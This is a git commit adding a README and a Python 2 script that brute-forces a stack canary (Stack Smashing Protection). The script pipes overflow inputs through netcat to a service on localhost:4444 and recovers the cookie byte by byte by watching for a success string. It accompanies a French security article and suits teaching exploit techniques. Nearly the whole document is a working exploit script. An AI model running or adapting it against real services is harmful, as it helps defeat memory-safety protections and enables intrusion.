1a876b283b620bddf4072dcb37f0eb59889c91a8
bdevigne <bdevigne@live.fr>
2015-04-03 10:26:51 +0200

    Ajout de script
    Ajout du script de bruteforce SSP

---
+++ Stack Cookie Bruteforce/README.md
@@ -0,0 +1,2 @@
+# Bruteforce SSP
+Scripts d'exploitation pour l'article [La Stack Smashing Protection: Un canary infaillible?](http://www.dailysecurity.fr/la-stack-smashing-protection/ "DailySecurity Bypass SSP")
---
+++ Stack Cookie Bruteforce/bruteforcessp.py
@@ -0,0 +1,34 @@
+# Brute Force Stack Smashing Protection
+# Auteur: Geluchat
+# http://www.dailysecurity.fr
+# Brute Force les octets du canary 1 par 1
+# Usage: Nombre de caractères pour provoquer l'overflow, Chaine qui apparait quand le canary est bon
+import os
+import re
+import sys
+from subprocess import Popen, PIPE, STDOUT
+ 
+Cookie = ""
+grep_stdout=""
+ 
+if len(sys.argv) < 4:
+        sys.exit('Usage: %s Nombre Overflow Chaine a trouver' % sys.argv[0])
+ 
+# On lance le programme
+ 
+index=0
+while index!=4:
+        grep_stdout=""
+        buff=-1
+        while re.search(sys.argv[2],grep_stdout) is None:
+                buff+=1
+                p = Popen(['nc','localhost','4444'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)
+                grep_stdout = p.communicate(input='f'*int(sys.argv[1])+Cookie+str(chr(buff)))[0]
+                print grep_stdout
+                if buff>127:
+                        print "[-] Cookie introuvable"
+                        exit(-1)
+        Cookie+=str(chr(buff))
+        index+=1
+ 
+print "[+] Le cookie est : 0x"+ Cookie.encode("hex")
